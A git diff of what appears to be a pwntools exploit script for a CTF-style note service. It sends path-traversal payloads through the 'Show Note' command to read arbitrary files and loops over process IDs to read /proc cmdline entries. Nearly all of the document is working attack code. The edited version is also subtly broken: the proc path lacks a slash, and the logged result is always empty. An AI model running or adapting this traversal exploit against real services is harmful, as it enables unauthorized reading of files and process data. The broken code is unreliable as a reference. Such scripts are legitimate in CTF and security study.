@@ -2,7 +2,6 @@ from pwn import *
 from tqdm import *
 
 context.arch = 'amd64'
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
 cmd_dic = {1:'Login', 2:'Register', 3:'New Note', 4:'Edit Note', 5:'Show Note'}
 def dealing_cmd(r, cmd, note_name=b'test', content=b'test\n', offset=b'0', random='0'):
@@ -43,17 +42,19 @@ def dealing_cmd(r, cmd, note_name=b'test', content=b'test\n', offset=b'0', rando
 
 def read_any_file(file_name):
     payload = b'../../../../../../' + b'/' * (89 - len(file_name)) + file_name
-    offset = 0
     res = ''
-    while(True):
-        ret = dealing_cmd(r, 5, payload, offset=str(offset).encode())
-        # print(ret, len(ret))
-        if ret != 'Read note failed.' and ret != "Couldn't open the file.":
-            res += ret
-            offset += 128
-        else:
-            log.success(res)
-            break
+    # while(True):
+    #     ret = dealing_cmd(r, 5, payload)
+    #     # print(ret, len(ret))
+    #     if ret != 'Read note failed.' and ret != "Couldn't open the file.":
+    #         res += ret
+    #         offset += 128
+    #     else:
+    #         log.success(res)
+    #         break
+    ret = dealing_cmd(r, 5, payload)
+    if ret != 'Read note failed.' and ret != "Couldn't open the file.":
+        log.success(res)
     return res
 
 # Register & Login
@@ -63,8 +64,6 @@ random = os.urandom(1).hex()
 dealing_cmd(r, 2, random=random)
 dealing_cmd(r, 1, random=random)
 
-for i in trange(777*2+150+221, 9999):
+for i in trange(777*2+150+221+432, 9999):
     file = b'/proc/' + str(i).encode() + b'cmdline'
-    # if i % 100:
-    #     log.info("")
     read_any_file(file)
